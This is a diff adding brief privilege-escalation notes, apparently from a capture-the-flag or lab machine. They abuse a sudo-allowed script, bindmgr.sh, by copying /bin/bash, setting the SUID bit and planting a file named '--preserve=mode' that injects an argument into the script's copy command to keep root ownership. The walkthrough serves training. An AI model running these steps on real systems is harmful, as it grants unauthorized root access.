@@ -1,0 +1,8 @@
+sudo -l ---> (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh (take a look at script.txt)
+
+1) 'echo "2" > .version' ---> make the script able to work (look the script for more info)
+2) with the script we can get privelege on the binary in the same directory
+3) copy /bin/bash to the folder ( cp /bin/bash . )
+4) use chmod +s on the copied file for chang the SUID
+5) after run the script "bash" still owned by the user ----> use 'echo "" > --preserve=mode  '
+6) root!
